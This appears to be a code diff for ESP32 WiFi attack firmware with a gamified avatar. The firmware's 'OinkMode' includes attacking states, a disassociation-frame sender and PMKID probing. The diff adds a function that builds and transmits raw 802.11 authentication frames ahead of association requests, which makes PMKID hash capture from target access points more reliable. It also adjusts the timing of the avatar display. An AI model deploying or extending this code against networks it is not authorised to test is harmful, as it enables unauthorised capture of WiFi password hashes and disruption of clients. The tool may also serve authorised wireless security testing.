@@ -594,18 +594,28 @@ void OinkMode::update() {
         bool wantTree = (autoState == AutoState::LOCKING ||
                          autoState == AutoState::ATTACKING ||
                          autoState == AutoState::WAITING);
-        static bool hadTree = false;
-        if (wantTree && !hadTree) {
-            uint8_t fruits = 0;
-            auto& nets = networks();
-            for (size_t i = 0; i < nets.size() && fruits < 8; i++) {
-                if (NetworkRecon::estimateClientCount(nets[i]) > 0) fruits++;
+        static bool treeShown = false;
+        static uint32_t wantTreeOffSince = 0;
+        uint32_t nowMs = millis();
+        if (wantTree) {
+            wantTreeOffSince = 0;
+            if (!treeShown) {
+                uint8_t fruits = 0;
+                auto& nets = networks();
+                for (size_t i = 0; i < nets.size() && fruits < 8; i++) {
+                    if (NetworkRecon::estimateClientCount(nets[i]) > 0) fruits++;
+                }
+                if (fruits > 0) { Avatar::showTree(fruits); treeShown = true; }
             }
-            if (fruits > 0) Avatar::showTree(fruits);
-        } else if (!wantTree && hadTree) {
-            Avatar::hideTree();
+        } else if (treeShown) {
+            // Linger a few seconds so brief hunting gaps between targets don't
+            // hide + regrow (spawn) the tree over and over.
+            if (wantTreeOffSince == 0) wantTreeOffSince = nowMs;
+            if (nowMs - wantTreeOffSince > 4000) {
+                Avatar::hideTree();
+                treeShown = false;
+            }
         }
-        hadTree = wantTree;
     }
 
     // Process pending mood: handshake complete
@@ -913,7 +923,12 @@ void OinkMode::update() {
                         if (currentChannel != targetChannel) {
                             setChannel(targetChannel);
                         }
+                        // IEEE 802.11 state machine: Auth must precede Assoc, or
+                        // most APs silently drop the Assoc from an unauthed STA.
+                        sendAuthenticationRequest(targetBssid);
+                        delay(10);  // AP processes auth in <2ms; 10ms is a safe margin
                         sendAssociationRequest(targetBssid, targetSSID, strlen(targetSSID));
+                        Avatar::waveRipple(WaveMode::OUTGOING);  // radiate on the probe
                         pmkidProbeTime = now;
                         if (pmkidTargetIndex < 64) pmkidProbedBitset |= (1ULL << pmkidTargetIndex);
                         Avatar::sniff();
@@ -2805,6 +2820,22 @@ void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, u
     disassocPacket[24] = reason;
     
     esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
+}
+
+void OinkMode::sendAuthenticationRequest(const uint8_t* bssid) {
+    // 802.11 Authentication Request (Open System) — required before Association.
+    // Most APs silently drop Assoc Requests from unauthenticated STAs.
+    uint8_t authFrame[30] = {};
+    authFrame[0] = 0xB0;  // FC: Type=Management, Subtype=Authentication
+    authFrame[1] = 0x00;
+    memcpy(authFrame + 4, bssid, 6);   // Addr1: destination (AP)
+    uint8_t ourMac[6];
+    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
+    memcpy(authFrame + 10, ourMac, 6); // Addr2: source (us)
+    memcpy(authFrame + 16, bssid, 6);  // Addr3: BSSID
+    // Auth body: Algorithm=Open System(0), Seq=1, Status=Success(0)
+    authFrame[26] = 0x01;              // Authentication SEQ: 1
+    esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
 }
 
 void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
